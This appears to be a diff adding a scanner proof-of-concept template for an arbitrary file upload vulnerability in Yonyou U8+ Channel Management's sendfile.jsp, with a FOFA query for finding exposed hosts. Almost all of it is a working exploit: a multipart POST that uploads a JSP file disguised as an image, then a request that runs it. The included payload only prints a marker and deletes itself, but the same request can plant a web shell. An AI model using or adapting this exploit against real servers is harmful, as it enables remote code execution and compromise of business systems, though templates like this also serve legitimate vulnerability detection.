@@ -1,0 +1,34 @@
+id: poc-yaml-yongyon-u8-cm-ae-sendfile-jsp-anyfile-upload
+info:
+  name: 用友U8+渠道管理(高级版) sendfile.jsp 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友U8+渠道管理(高级版)
+  fofa: body="用友U8CRM"
+variables:
+  t1: random_str(5)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /business/common/importdata/sendfile.jsp
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: image/jpeg
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: "status_code == 200 && \ncontains(body,\"userfile\") &&\ncontains(body,\"\
+    .jsp\")\n"
+  output:
+  - regex_match(body,"(?P<file>[0-9a-z]{32}).jsp")
+- method: GET
+  path: /userfile/default/temp/{{.file}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
